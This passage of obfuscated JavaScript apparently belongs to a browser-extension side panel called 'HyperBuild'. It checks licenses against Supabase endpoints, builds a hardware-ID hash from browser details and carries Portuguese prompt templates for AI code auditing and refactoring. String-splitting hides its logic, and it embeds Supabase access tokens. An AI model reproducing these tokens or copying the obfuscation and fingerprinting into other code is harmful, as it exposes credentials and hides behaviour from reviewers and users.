
(function(){if(window.location.protocol==="file:")return;setInterval(function(){if(typeof console==="undefined")return;},4000);})();
if(typeof chrome==='und'+'efi'+'ned'||!chrome['run'+'tim'+'e']||!chrome['run'+'tim'+'e']['id']){
const sp_n445789={
}
;
sp_n445789['add'+'Lis'+'ten'+'er']=()=>{
}
,sp_n445789['rem'+'ove'+'Lis'+'ten'+'er']=()=>{
}
,window['chr'+'ome']=window['chr'+'ome']||{
'runtime':{
'id':'moc'+'k-e'+'xte'+'nsi'+'on-'+'id','sendMessage':(_n3fdce3,_ne0ed)=>{
console['log']('Moc'+'k\x20s'+'end'+'Mes'+'sag'+'e:',_n3fdce3);
const _n4c768c={
}
;
_n4c768c['sta'+'tus']='ok',_n4c768c['dat'+'a']={
}
;
if(_ne0ed)setTimeout(()=>_ne0ed(_n4c768c),0x0);
}
,'lastError':null}
,'storage':{
'local':{
'get':(_n59c494,_n587b86)=>{
const _n494435={
}
,_n151321=_n41235d=>{
try{
const _n1083b1=localStorage['get'+'Ite'+'m'](_n41235d);
return _n1083b1?JSON['par'+'se'](_n1083b1):undefined;
}
catch(_n1c3f06){
return undefined;
}
}
;
if(Array['isA'+'rra'+'y'](_n59c494))_n59c494['for'+'Eac'+'h'](_n2f8301=>_n494435[_n2f8301]=_n151321(_n2f8301));
else{
if(typeof _n59c494==='str'+'ing')_n494435[_n59c494]=_n151321(_n59c494);
else for(let _n4609be in _n59c494){
const _n31350b=_n151321(_n4609be);
_n494435[_n4609be]=_n31350b!==undefined?_n31350b:_n59c494[_n4609be];
}
}
if(_n587b86)setTimeout(()=>_n587b86(_n494435),0x0);
return Promise['res'+'olv'+'e'](_n494435);
}
,'set':(_n3df54b,_n2f77f7)=>{
for(let _n51adb9 in _n3df54b)localStorage['set'+'Ite'+'m'](_n51adb9,JSON['str'+'ing'+'ify'](_n3df54b[_n51adb9]));
if(_n2f77f7)setTimeout(_n2f77f7,0x0);
return Promise['res'+'olv'+'e']();
}
,'remove':(_n447fcf,_n2f681f)=>{
if(Array['isA'+'rra'+'y'](_n447fcf))_n447fcf['for'+'Eac'+'h'](_n2b5d10=>localStorage['rem'+'ove'+'Ite'+'m'](_n2b5d10));
else localStorage['rem'+'ove'+'Ite'+'m'](_n447fcf);
if(_n2f681f)setTimeout(_n2f681f,0x0);
return Promise['res'+'olv'+'e']();
}
}
,'onChanged':sp_n445789}
,'tabs':{
'query':(_n3b8911,_n1b62c7)=>{
const _n23e1a9={
}
;
_n23e1a9['id']=0x1,_n23e1a9['act'+'ive']=!![];
if(_n1b62c7)setTimeout(()=>_n1b62c7([_n23e1a9]),0x0);
const _n16482f={
}
;
return _n16482f['id']=0x1,_n16482f['act'+'ive']=!![],Promise['res'+'olv'+'e']([_n16482f]);
}
}
,'scripting':{
'executeScript':()=>Promise['res'+'olv'+'e']([])}
}
;
}
(function(){
console['log']('[Hy'+'per'+'Bui'+'ld]'+'\x20Si'+'dep'+'ane'+'l\x20v'+'4.7'+'\x20in'+'ici'+'ali'+'zad'+'o');
const _n45adda='cvb'+'grj'+'auq'+('jaw'+'rsy'+'knh'+'yj'),_n17ce4c='dwp'+'uqe'+'wn'+('fib'+'eld'+'egv'+'imp'),_n5e8da7='hck'+'ncg'+'rf'+('hed'+'osw'+'sdk'+'yni'),_n2ad277='htt'+'ps:'+'//'+_n45adda+('.su'+'pab'+'ase'+'.co'),_n49d33d=_n2ad277+('/fu'+'nct'+'ion'+'s/v'+'1/v'+'ali'+'dat'+'e-l'+'ice'+'nse'),_n292e0d='htt'+'ps:'+'//'+_n17ce4c+('.su'+'pab'+'ase'+'.co'+'/fu'+'nct'+'ion'+'s/v'+'1/v'+'ali'+'dat'+'e-c'+'hil'+'d-l'+'ice'+'nse'),_n4db6bf='htt'+'ps:'+'//'+_n17ce4c+('.su'+'pab'+'ase'+'.co'+'/fu'+'nct'+'ion'+'s/v'+'1/r'+'ese'+'t-l'+'ice'+'nse'+'-hw'+'id'),_n457543=_n2ad277+('/fu'+'nct'+'ion'+'s/v'+'1/o'+'pti'+'miz'+'e-p'+'rom'+'pt'),_n65ee61=_n2ad277+('/fu'+'nct'+'ion'+'s/v'+'1/g'+'et-'+'not'+'ifi'+'cat'+'ion'+'s'),_n4a99ce=_n2ad277+('/fu'+'nct'+'ion'+'s/v'+'1/g'+'et-'+'ver'+'sio'+'ns'),_n3628dc=_n2ad277+('/fu'+'nct'+'ion'+'s/v'+'1/g'+'et-'+'use'+'r-r'+'ole'),_n15d232='htt'+'ps:'+'//'+_n5e8da7+('.su'+'pab'+'ase'+'.co'+'/fu'+'nct'+'ion'+'s/v'+'1/s'+'end'+'-co'+'mma'+'nd-'+'v4'),_n3920b8=['eyJ'+'hbG'+'ciO'+'iJI'+'UzI'+'1Ni'+'I','sIn'+'R5c'+'CI6'+'Ikp'+'XVC'+'J9.'+'e','yJp'+'c3M'+'iOi'+'Jzd'+'XBh'+'YmF'+'z','ZSI'+'sIn'+'JlZ'+'iI6'+'ImN'+'2Ym'+'d','yam'+'F1c'+'Wph'+'d3J'+'zeW'+'tua'+'H','lqI'+'iwi'+'cm9'+'sZS'+'I6I'+'mFu'+'b','24i'+'LCJ'+'pYX'+'QiO'+'jE3'+'NzU'+'2','NTk'+'1OT'+'YsI'+'mV4'+'cCI'+'6Mj'+'A','5MT'+'IzN'+'TU5'+'Nn0'+'.Jd'+'ZeY'+'3','9iG'+'HcZ'+'5P3'+'p0D'+'DXY'+'VUv'+'N','JfM'+'rKp'+'_Or'+'aUC'+'5ED'+'yzU']['joi'+'n'](''),_n2f1881=['eyJ'+'hbG'+'ciO'+'iJI'+'UzI'+'1Ni'+'I','sIn'+'R5c'+'CI6'+'Ikp'+'XVC'+'J9.'+'e','yJp'+'c3M'+'iOi'+'Jzd'+'XBh'+'YmF'+'z','ZSI'+'sIn'+'JlZ'+'iI6'+'ImR'+'3cH'+'V','xZX'+'duZ'+'mli'+'ZWx'+'kZW'+'d2a'+'W','1wI'+'iwi'+'cm9'+'sZS'+'I6I'+'mFu'+'b','24i'+'LCJ'+'pYX'+'QiO'+'jE3'+'NzQ'+'4','MDc'+'1ND'+'AsI'+'mV4'+'cCI'+'6Mj'+'A','5MD'+'M4M'+'zU0'+'MH0'+'.6C'+'Wog'+'n','3dn'+'NLD'+'v94'+'Oko'+'URo'+'BWU'+'3','ZRR'+'BRd'+'3Cl'+'Vdh'+'L83'+'A5I']['joi'+'n'](''),_n48aaeb=['eyJ'+'hbG'+'ciO'+'iJI'+'UzI'+'1Ni'+'I','sIn'+'R5c'+'CI6'+'Ikp'+'XVC'+'J9.'+'e','yJp'+'c3M'+'iOi'+'Jzd'+'XBh'+'YmF'+'z','ZSI'+'sIn'+'JlZ'+'iI6'+'Imh'+'ja2'+'5','jZ3'+'Jma'+'GVk'+'b3N'+'3c2'+'Rre'+'W','5pI'+'iwi'+'cm9'+'sZS'+'I6I'+'mFu'+'b','24i'+'LCJ'+'pYX'+'QiO'+'jE3'+'Nzk'+'4','MTM'+'5Nj'+'ksI'+'mV4'+'cCI'+'6Mj'+'A','5NT'+'M4O'+'Tk2'+'OX0'+'.Nc'+'miF'+'O','kEj'+'VGS'+'3oP'+'16A'+'i6p'+'Hzm'+'p','ktU'+'ShV'+'zPU'+'QYC'+'XfH'+'-dQ']['joi'+'n'](''),_nf7e693='dis'+'pat'+'ch'+('_mo'+'de');
let _n6a372d=null,_n1ba7e3=null,_n10b465=null,_n472837=null,_n4f7518=null,_n2f3531=null,_n139915=![],_n3b825c=null,_n1ad1e7=null,_n3ee618=![],_n90774c=![],_n45bf4c=![],_n11f60c='cla'+'ude'+'-op'+'us',_n443c3a=![],_n39b796=null,_n2b5999=null,_n14a310=null,_n227820=[],_ne2d945='all',_n12c2f4=![],_n1bed2b=[];
function _n4ce99a(_n46adb7){
if(_n3ee618===![]&&!_n4f7518&&!_n3b825c)return;
_n3ee618=![];
_n4f7518&&(clearInterval(_n4f7518),_n4f7518=null);
_n3b825c&&(clearTimeout(_n3b825c),_n3b825c=null);
if(_n46adb7)_n1ad1e7=_n46adb7;
chrome['sto'+'rag'+'e']['loc'+'al']['rem'+'ove'](['ql_'+'lic'+'ens'+'e_v'+'ali'+'d','ql_'+'lk','ql_'+'ses'+'sio'+'n_i'+'d','ql_'+'use'+'r_n'+'ame','ql_'+'exp'+'ire'+'s_a'+'t','ql_'+'act'+'iva'+'ted'+'_at','ql_'+'lic'+'ens'+'e_s'+'tat'+'us','ql_'+'ed','ql_'+'ck'],()=>{
_n1ba7e3=null,_n10b465=null,_n472837=null,_n6a372d=null;
try{
_n29f51a();
}
catch(_n5d909d){
}
}
);
}
async function _n19b41c(){
try{
const _nf524ed=await new Promise(_n3d27f5=>chrome['sto'+'rag'+'e']['loc'+'al']['get'](['__l'+'v_p'+'id'],_n3d27f5)),_ne12a02=_nf524ed['__l'+'v_p'+'id'];
if(!_ne12a02)return null;
const _n22a37b=navigator['use'+'rAg'+'ent']||'ua',_n353c58=navigator['lan'+'gua'+'ge']||'lan'+'g',_n42fc04=navigator['pla'+'tfo'+'rm']||'pla'+'t',_n12e541=navigator['har'+'dwa'+'reC'+'onc'+'urr'+'enc'+'y']||0x0,_n30de53=_n22a37b+'|'+_n353c58+'|'+_n42fc04+'|'+_n12e541+'|'+_ne12a02,_n5e6c50=await crypto['sub'+'tle']['dig'+'est']('SHA'+'-25'+'6',new TextEncoder()['enc'+'ode'](_n30de53));
return Array['fro'+'m'](new Uint8Array(_n5e6c50))['map'](_n11752a=>_n11752a['toS'+'tri'+'ng'](0x10)['pad'+'Sta'+'rt'](0x2,'0'))['joi'+'n']('');
}
catch(_n25caf0){
return null;
}
}
chrome['sto'+'rag'+'e']['onC'+'han'+'ged']['add'+'Lis'+'ten'+'er']((_n5d8f28,_n454243)=>{
if(_n454243!=='loc'+'al'||!_n3ee618)return;
const _n3d40ef=_n4a4ed8=>_n4a4ed8 in _n5d8f28&&(_n5d8f28[_n4a4ed8]['new'+'Val'+'ue']===undefined||_n5d8f28[_n4a4ed8]['new'+'Val'+'ue']===null||_n5d8f28[_n4a4ed8]['new'+'Val'+'ue']===![]);
(_n3d40ef('ql_'+'lic'+'ens'+'e_v'+'ali'+'d')||_n3d40ef('ql_'+'lk')||_n3d40ef('ql_'+'ck'))&&_n4ce99a(spT('log'+'out'+'_bl'+'ock'+'ed_'+'res'+'et'));
}
);
function _n13f13d(_n2697f6){
_n3b825c&&(clearTimeout(_n3b825c),_n3b825c=null);
if(!_n2697f6)return;
const _n11a94e=new Date(_n2697f6)['get'+'Tim'+'e']()-Date['now']();
if(isNaN(_n11a94e))return;
const _n19e677=()=>_n4ce99a(spT('log'+'out'+'_ex'+'pir'+'ed_'+'ren'+'ew'));
if(_n11a94e<=0x0){
_n19e677();
return;
}
_n3b825c=setTimeout(_n19e677,Math['min'](_n11a94e,0x7ffffd78));
}
let _ne62fcc=[],_n10870e=0x0,_n20609f=0x0,_n12caa4='pro'+'mpt',_n1bd680=[],_n3d197e=0x0;
const _n3d6cca=0xf,_n18d87f=Infinity,_n3f0c2a='ql_'+'cha'+'t_h'+'ist'+'ory',_n39343c=0xc8,_n4ca228='5.5',_n3c5b11='htt'+'ps:'+'//d'+'wpu'+'qew'+'nfi'+'bel'+'deg'+'vim'+'p.s'+'upa'+'bas'+'e.c'+'o/f'+'unc'+'tio'+'ns/'+'v1/'+'get'+'-sk'+'ill'+'s',_n502e99='ql_'+'ski'+'lls'+'_ca'+'che',_n2565eb=0x3c*0x3c*0x3e8,_n218464='ql_'+'ski'+'lls'+'_fa'+'vor'+'ite'+'s',_n11cdfc={
}
;
_n11cdfc['id']='qa-'+'cor'+'rig'+'ir',_n11cdfc['emo'+'ji']='🔧',_n11cdfc['lab'+'el']='COR'+'RIG'+'IR',_n11cdfc['tex'+'t']='Ana'+'lis'+'e\x20c'+'omp'+'let'+'ame'+'nte'+'\x20to'+'do\x20'+'o\x20p'+'roj'+'eto'+'\x20e\x20'+'ide'+'nti'+'fiq'+'ue\x20'+'TOD'+'OS\x20'+'os\x20'+'bug'+'s,\x20'+'err'+'os,'+'\x20fa'+'lha'+'s,\x20'+'com'+'por'+'tam'+'ent'+'os\x20'+'ine'+'spe'+'rad'+'os\x20'+'e\x20p'+'oss'+'íve'+'is\x20'+'pro'+'ble'+'mas'+'\x20ex'+'ist'+'ent'+'es\x20'+'na\x20'+'apl'+'ica'+'ção'+'.\x0a\x0a'+'Seu'+'\x20ob'+'jet'+'ivo'+'\x20é\x20'+'rea'+'liz'+'ar\x20'+'uma'+'\x20au'+'dit'+'ori'+'a\x20t'+'écn'+'ica'+'\x20pr'+'ofu'+'nda'+'\x20no'+'\x20si'+'ste'+'ma\x20'+'int'+'eir'+'o,\x20'+'cor'+'rig'+'ind'+'o\x20p'+'rob'+'lem'+'as\x20'+'de\x20'+'lóg'+'ica'+',\x20f'+'ron'+'ten'+'d,\x20'+'bac'+'ken'+'d,\x20'+'int'+'egr'+'açã'+'o,\x20'+'ren'+'der'+'iza'+'ção'+',\x20e'+'sta'+'do,'+'\x20ba'+'nco'+'\x20de'+'\x20da'+'dos'+',\x20r'+'esp'+'ons'+'ivi'+'dad'+'e\x20e'+'\x20pe'+'rfo'+'rma'+'nce'+'.\x0a\x0a'+'Ant'+'es\x20'+'de\x20'+'mod'+'ifi'+'car'+'\x20qu'+'alq'+'uer'+'\x20co'+'isa'+':\x0a-'+'\x20An'+'ali'+'se\x20'+'tod'+'a\x20a'+'\x20es'+'tru'+'tur'+'a\x20d'+'o\x20p'+'roj'+'eto'+'\x0a-\x20'+'Ana'+'lis'+'e\x20r'+'ota'+'s\x0a-'+'\x20An'+'ali'+'se\x20'+'com'+'pon'+'ent'+'es\x0a'+'-\x20A'+'nal'+'ise'+'\x20ho'+'oks'+'\x0a-\x20'+'Ana'+'lis'+'e\x20e'+'sta'+'dos'+'\x20gl'+'oba'+'is\x0a'+'-\x20A'+'nal'+'ise'+'\x20in'+'teg'+'raç'+'ões'+'\x0a-\x20'+'Ana'+'lis'+'e\x20S'+'upa'+'bas'+'e\x0a-'+'\x20An'+'ali'+'se\x20'+'API'+'s\x0a-'+'\x20An'+'ali'+'se\x20'+'ban'+'co\x20'+'de\x20'+'dad'+'os\x0a'+'-\x20A'+'nal'+'ise'+'\x20au'+'ten'+'tic'+'açã'+'o\x0a-'+'\x20An'+'ali'+'se\x20'+'per'+'mis'+'sõe'+'s\x0a-'+'\x20An'+'ali'+'se\x20'+'car'+'reg'+'ame'+'nto'+'s\x0a-'+'\x20An'+'ali'+'se\x20'+'con'+'sol'+'e\x20e'+'rro'+'rs\x0a'+'-\x20A'+'nal'+'ise'+'\x20wa'+'rni'+'ngs'+'\x0a-\x20'+'Ana'+'lis'+'e\x20l'+'ogs'+'\x0a-\x20'+'Ana'+'lis'+'e\x20c'+'omp'+'ort'+'ame'+'nto'+'\x20da'+'\x20in'+'ter'+'fac'+'e\x0a-'+'\x20An'+'ali'+'se\x20'+'res'+'pon'+'siv'+'ida'+'de\x0a'+'-\x20A'+'nal'+'ise'+'\x20po'+'ssí'+'vei'+'s\x20f'+'alh'+'as\x20'+'sil'+'enc'+'ios'+'as\x0a'+'-\x20A'+'nal'+'ise'+'\x20se'+'gur'+'anç'+'a\x20b'+'ási'+'ca\x0a'+'-\x20A'+'nal'+'ise'+'\x20fl'+'uxo'+'s\x20c'+'omp'+'let'+'os\x20'+'do\x20'+'sis'+'tem'+'a\x0a\x0a'+'Ide'+'nti'+'fiq'+'ue\x20'+'e\x20c'+'orr'+'ija'+':\x0a-'+'\x20Bu'+'gs\x20'+'vis'+'uai'+'s\x0a-'+'\x20Bu'+'gs\x20'+'de\x20'+'nav'+'ega'+'ção'+'\x0a-\x20'+'Err'+'os\x20'+'de\x20'+'con'+'sol'+'e\x0a-'+'\x20Wa'+'rni'+'ngs'+'\x0a-\x20'+'Loo'+'ps\x20'+'inf'+'ini'+'tos'+'\x0a-\x20'+'P'+('rob'+'lem'+'as\x20'+'de\x20'+'ren'+'der'+'iza'+'ção'+'\x0a-\x20'+'Re-'+'ren'+'der'+'iza'+'çõe'+'s\x20d'+'esn'+'ece'+'ssá'+'ria'+'s\x0a-'+'\x20Fa'+'lha'+'s\x20d'+'e\x20a'+'ute'+'nti'+'caç'+'ão\x0a'+'-\x20P'+'rob'+'lem'+'as\x20'+'de\x20'+'ses'+'são'+'\x0a-\x20'+'Pro'+'ble'+'mas'+'\x20de'+'\x20pe'+'rmi'+'ssõ'+'es\x0a'+'-\x20P'+'rob'+'lem'+'as\x20'+'de\x20'+'loa'+'din'+'g\x0a-'+'\x20Pr'+'obl'+'ema'+'s\x20d'+'e\x20e'+'sta'+'do\x0a'+'-\x20P'+'rob'+'lem'+'as\x20'+'de\x20'+'sin'+'cro'+'niz'+'açã'+'o\x0a-'+'\x20Pr'+'obl'+'ema'+'s\x20d'+'e\x20r'+'esp'+'ons'+'ivi'+'dad'+'e\x0a-'+'\x20Pr'+'obl'+'ema'+'s\x20d'+'e\x20f'+'orm'+'ulá'+'rio'+'s\x0a-'+'\x20Pr'+'obl'+'ema'+'s\x20d'+'e\x20v'+'ali'+'daç'+'ão\x0a'+'-\x20P'+'rob'+'lem'+'as\x20'+'em\x20'+'cha'+'mad'+'as\x20'+'API'+'\x0a-\x20'+'Pro'+'ble'+'mas'+'\x20em'+'\x20qu'+'eri'+'es\x20'+'Sup'+'aba'+'se\x0a'+'-\x20P'+'rob'+'lem'+'as\x20'+'de\x20'+'rea'+'lti'+'me\x0a'+'-\x20P'+'rob'+'lem'+'as\x20'+'de\x20'+'cac'+'he\x0a'+'-\x20P'+'rob'+'lem'+'as\x20'+'de\x20'+'tip'+'age'+'m\x0a-'+'\x20Pr'+'obl'+'ema'+'s\x20d'+'e\x20i'+'mpo'+'rts'+'\x0a-\x20'+'Pro'+'ble'+'mas'+'\x20de'+'\x20de'+'pen'+'dên'+'cia'+'s\x0a-'+'\x20Pr'+'obl'+'ema'+'s\x20d'+'e\x20p'+'erf'+'orm'+'anc'+'e\x0a-'+'\x20Pr'+'obl'+'ema'+'s\x20d'+'e\x20U'+'X\x0a-'+'\x20Pr'+'obl'+'ema'+'s\x20m'+'obi'+'le\x0a'+'-\x20P'+'rob'+'lem'+'as\x20'+'de\x20'+'ace'+'ssi'+'bil'+'ida'+'de\x0a'+'-\x20M'+'emo'+'ry\x20'+'lea'+'ks\x0a'+'-\x20R'+'equ'+'est'+'s\x20d'+'upl'+'ica'+'dos'+'\x0a-\x20'+'Con'+'diç'+'ões'+'\x20de'+'\x20co'+'rri'+'da\x0a'+'-\x20F'+'alh'+'as\x20'+'sil'+'enc'+'ios'+'as\x0a'+'-\x20T'+'rat'+'ame'+'nto'+'\x20in'+'cor'+'ret'+'o\x20d'+'e\x20e'+'rro'+'s\x0a-'+'\x20Qu'+'ebr'+'as\x20'+'em\x20'+'edg'+'e\x20c'+'ase'+'s\x0a\x0a'+'Ver'+'ifi'+'que'+'\x20es'+'pec'+'ial'+'men'+'te:'+'\x0a-\x20'+'Flu'+'xos'+'\x20de'+'\x20lo'+'gin'+'/lo'+'gou'+'t\x0a-'+'\x20Pe'+'rsi'+'stê'+'nci'+'a\x20d'+'e\x20s'+'ess'+'ão\x0a'+'-\x20P'+'rot'+'eçã'+'o\x20d'+'e\x20r'+'ota'+'s\x0a-'+'\x20Na'+'veg'+'açã'+'o\x20e'+'ntr'+'e\x20p'+'ági'+'nas'+'\x0a-\x20'+'CRU'+'Ds\x20'+'com'+'ple'+'tos'+'\x0a-\x20'+'Upl'+'oad'+'s\x0a-'+'\x20Mo'+'dai'+'s\x0a-'+'\x20Es'+'tad'+'os\x20'+'ass'+'ínc'+'ron'+'os\x0a'+'-\x20A'+'tua'+'liz'+'açõ'+'es\x20'+'em\x20'+'tem'+'po\x20'+'rea'+'l\x0a-'+'\x20Co'+'mpa'+'tib'+'ili'+'dad'+'e\x20m'+'obi'+'le\x0a'+'-\x20R'+'esp'+'ons'+'ivi'+'dad'+'e\x20g'+'era'+'l\x0a-'+'\x20Co'+'mpo'+'nen'+'tes'+'\x20re'+'uti'+'liz'+'áve'+'is\x0a'+'-\x20I'+'nte'+'gra'+'çõe'+'s\x20e'+'x')+('ter'+'nas'+'\x0a-\x20'+'Web'+'hoo'+'ks\x0a'+'-\x20F'+'lux'+'os\x20'+'crí'+'tic'+'os\x20'+'do\x20'+'sis'+'tem'+'a\x0a\x0a'+'Dur'+'ant'+'e\x20a'+'\x20an'+'áli'+'se:'+'\x0a1.'+'\x20Li'+'ste'+'\x20os'+'\x20pr'+'obl'+'ema'+'s\x20e'+'nco'+'ntr'+'ado'+'s\x0a2'+'.\x20E'+'xpl'+'iqu'+'e\x20a'+'\x20ca'+'usa'+'\x20de'+'\x20ca'+'da\x20'+'pro'+'ble'+'ma\x0a'+'3.\x20'+'Exp'+'liq'+'ue\x20'+'o\x20i'+'mpa'+'cto'+'\x20no'+'\x20si'+'ste'+'ma\x0a'+'4.\x20'+'Cor'+'rij'+'a\x20u'+'til'+'iza'+'ndo'+'\x20bo'+'as\x20'+'prá'+'tic'+'as\x20'+'mod'+'ern'+'as\x0a'+'5.\x20'+'Gar'+'ant'+'a\x20q'+'ue\x20'+'a\x20c'+'orr'+'eçã'+'o\x20n'+'ão\x20'+'que'+'bre'+'\x20fu'+'nci'+'ona'+'lid'+'ade'+'s\x20e'+'xis'+'ten'+'tes'+'\x0a\x0aR'+'egr'+'as\x20'+'imp'+'ort'+'ant'+'es:'+'\x0a-\x20'+'NÃO'+'\x20re'+'mov'+'er\x20'+'fun'+'cio'+'nal'+'ida'+'des'+'\x20se'+'m\x20n'+'ece'+'ssi'+'dad'+'e\x0a-'+'\x20NÃ'+'O\x20a'+'lte'+'rar'+'\x20de'+'sig'+'n\x20s'+'em\x20'+'mot'+'ivo'+'\x0a-\x20'+'NÃO'+'\x20cr'+'iar'+'\x20so'+'luç'+'ões'+'\x20te'+'mpo'+'rár'+'ias'+'\x20ou'+'\x20ga'+'mbi'+'arr'+'a\x0a-'+'\x20Se'+'mpr'+'e\x20a'+'pli'+'car'+'\x20so'+'luç'+'ões'+'\x20pr'+'ofi'+'ssi'+'ona'+'is\x0a'+'-\x20P'+'rio'+'riz'+'ar\x20'+'est'+'abi'+'lid'+'ade'+',\x20s'+'egu'+'ran'+'ça\x20'+'e\x20c'+'onf'+'iab'+'ili'+'dad'+'e\x0a-'+'\x20Ga'+'ran'+'tir'+'\x20có'+'dig'+'o\x20l'+'imp'+'o\x20e'+'\x20su'+'ste'+'ntá'+'vel'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'tra'+'tam'+'ent'+'o\x20d'+'e\x20e'+'rro'+'s\x20e'+'m\x20t'+'oda'+'\x20ap'+'lic'+'açã'+'o\x0a-'+'\x20Va'+'lid'+'ar\x20'+'edg'+'e\x20c'+'ase'+'s\x20i'+'mpo'+'rta'+'nte'+'s\x0a-'+'\x20Ga'+'ran'+'tir'+'\x20co'+'mpa'+'tib'+'ili'+'dad'+'e\x20m'+'obi'+'le\x20'+'e\x20d'+'esk'+'top'+'\x0a\x0aA'+'pós'+'\x20fi'+'nal'+'iza'+'r:\x0a'+'-\x20F'+'aça'+'\x20um'+'a\x20n'+'ova'+'\x20va'+'rre'+'dur'+'a\x20c'+'omp'+'let'+'a\x0a-'+'\x20Ve'+'rif'+'iqu'+'e\x20s'+'e\x20a'+'ind'+'a\x20e'+'xis'+'tem'+'\x20er'+'ros'+'\x0a-\x20'+'Ver'+'ifi'+'que'+'\x20po'+'ssí'+'vei'+'s\x20r'+'egr'+'ess'+'ões'+'\x0a-\x20'+'Gar'+'ant'+'a\x20e'+'sta'+'bil'+'ida'+'de\x20'+'ger'+'al\x20'+'do\x20'+'sis'+'tem'+'a\x0a\x0a'+'O\x20r'+'esu'+'lta'+'do\x20'+'fin'+'al\x20'+'dev'+'e\x20d'+'eix'+'ar\x20'+'a\x20a'+'pli'+'caç'+'ão:'+'\x0a-\x20'+'Est'+'áve'+'l\x0a-'+'\x20Co'+'nfi'+'áve'+'l\x0a-'+'\x20Se'+'m\x20e'+'rro'+'s\x20v'+'isí'+'vei'+'s\x0a-'+'\x20Se'+'m\x20w'+'arn'+'ing'+'s\x20d'+'esn'+'ece'+'ssá'+'rio'+'s\x0a-'+'\x20Se'+'m\x20b'+'ugs'+'\x20cr'+'íti'+'cos'+'\x0a-\x20'+'Flu'+'ida'+'\x0a-\x20'+'Res'+'pon'+'siv'+'a')+('\x0a-\x20'+'Pro'+'fis'+'sio'+'nal'+'\x0a-\x20'+'Pro'+'nta'+'\x20pa'+'ra\x20'+'pro'+'duç'+'ão');
const _n4f39aa={
}
;
_n4f39aa['id']='qa-'+'ref'+'ato'+'rar',_n4f39aa['emo'+'ji']='⚖️',_n4f39aa['lab'+'el']='REF'+'ATO'+'RAR',_n4f39aa['tex'+'t']='Ana'+'lis'+'e\x20t'+'odo'+'\x20o\x20'+'pro'+'jet'+'o\x20d'+'e\x20f'+'orm'+'a\x20c'+'omp'+'let'+'a\x20a'+'nte'+'s\x20d'+'e\x20r'+'eal'+'iza'+'r\x20q'+'ual'+'que'+'r\x20a'+'lte'+'raç'+'ão\x20'+'e\x20e'+'xec'+'ute'+'\x20um'+'a\x20r'+'efa'+'tor'+'açã'+'o\x20p'+'rof'+'und'+'a\x20e'+'\x20es'+'tru'+'tur'+'ada'+'\x20em'+'\x20to'+'da\x20'+'a\x20b'+'ase'+'\x20de'+'\x20có'+'dig'+'o.\x0a'+'\x0aSe'+'u\x20o'+'bje'+'tiv'+'o\x20é'+'\x20me'+'lho'+'rar'+'\x20a\x20'+'qua'+'lid'+'ade'+'\x20in'+'ter'+'na\x20'+'do\x20'+'sis'+'tem'+'a\x20s'+'em\x20'+'alt'+'era'+'r\x20f'+'unc'+'ion'+'ali'+'dad'+'es\x20'+'ou\x20'+'com'+'por'+'tam'+'ent'+'o\x20v'+'isí'+'vel'+'\x20da'+'\x20ap'+'lic'+'açã'+'o.\x0a'+'\x0aA\x20'+'ref'+'ato'+'raç'+'ão\x20'+'dev'+'e\x20t'+'orn'+'ar\x20'+'o\x20c'+'ódi'+'go\x20'+'mai'+'s\x20l'+'imp'+'o,\x20'+'org'+'ani'+'zad'+'o,\x20'+'esc'+'alá'+'vel'+',\x20p'+'adr'+'oni'+'zad'+'o\x20e'+'\x20fá'+'cil'+'\x20de'+'\x20ma'+'nte'+'r.\x0a'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'ESC'+'OPO'+'\x20DA'+'\x20RE'+'FAT'+'ORA'+'ÇÃO'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'\x0aRe'+'ali'+'ze\x20'+'uma'+'\x20re'+'vis'+'ão\x20'+'com'+'ple'+'ta\x20'+'de:'+'\x0a\x0a-'+'\x20Es'+'tru'+'tur'+'a\x20d'+'e\x20p'+'ast'+'as\x20'+'e\x20o'+'rga'+'niz'+'açã'+'o\x20d'+'o\x20p'+'roj'+'eto'+'\x0a-\x20'+'Com'+'pon'+'ent'+'es\x20'+'e\x20s'+'ua\x20'+'reu'+'til'+'iza'+'ção'+'\x0a-\x20'+'Hoo'+'ks\x20'+'cus'+'tom'+'iza'+'dos'+'\x0a-\x20'+'Lóg'+'ica'+'\x20de'+'\x20es'+'tad'+'o\x20('+'loc'+'al\x20'+'e\x20g'+'lob'+'al)'+'\x0a-\x20'+'Ser'+'vic'+'es\x20'+'e\x20c'+'ama'+'das'+'\x20de'+'\x20AP'+'I\x0a-'+'\x20In'+'teg'+'raç'+'ão\x20'+'com'+'\x20Su'+'pab'+'ase'+'\x0a-\x20'+'Que'+'rie'+'s\x20e'+'\x20ma'+'nip'+'ula'+'ção'+'\x20de'+'\x20da'+'dos'+'\x0a-\x20'+'Flu'+'xos'+'\x20de'+'\x20au'+'ten'+'tic'+'açã'+'o\x0a-'+'\x20Ro'+'tas'+'\x20e\x20'+'est'+'rut'+'ura'+'\x20de'+'\x20na'+'veg'+'açã'+'o\x0a-'+'\x20Ti'+'pag'+'em\x20'+'(Ty'+'peS'+'cri'+'pt\x20'+'se\x20'+'apl'+'icá'+'vel'+')\x0a-'+'\x20Ló'+'gic'+'a\x20d'+'upl'+'ica'+'da\x20'+'ou\x20'+'red'+'und'+'ant'+'e\x0a-'+'\x20Fu'+'nçõ'+'es\x20'+'gra'+'nde'+'s\x20o'+'u\x20m'+'al\x20'+'div'+'idi'+'das'+'\x0a-\x20'+'Aco'+'pla'+'men'+'to\x20'+'exc'+'ess'+'ivo'+'\x20en'+'tre'+'\x20co'+'mpo'+'nen'+'tes'+'\x0a-\x20'+'Cód'+'igo'+'\x20di'+'fíc'+'il\x20'+'de\x20'+'man'+'ter'+'\x20ou'+'\x20en'+'ten'+'der'+'\x0a-\x20'+'Imp'+'ort'+'s\x20d'+'eso'+'rga'+'niz'+'ado'+'s\x0a-'+'\x20Re'+'gra'+'s\x20d'+'e\x20n'+'egó'+'cio'+'\x20mi'+'stu'+'rad'+'as\x20'+'c'+('om\x20'+'UI\x0a'+'-\x20M'+'ani'+'pul'+'açã'+'o\x20d'+'e\x20e'+'fei'+'tos'+'\x20co'+'lat'+'era'+'is\x0a'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'OBJ'+'ETI'+'VOS'+'\x20PR'+'INC'+'IPA'+'IS\x0a'+''+''+''+''+''+''+'━\x0a\x0a'+'-\x20R'+'edu'+'zir'+'\x20du'+'pli'+'caç'+'ão\x20'+'de\x20'+'cód'+'igo'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'leg'+'ibi'+'lid'+'ade'+'\x20e\x20'+'cla'+'rez'+'a\x0a-'+'\x20Me'+'lho'+'rar'+'\x20se'+'par'+'açã'+'o\x20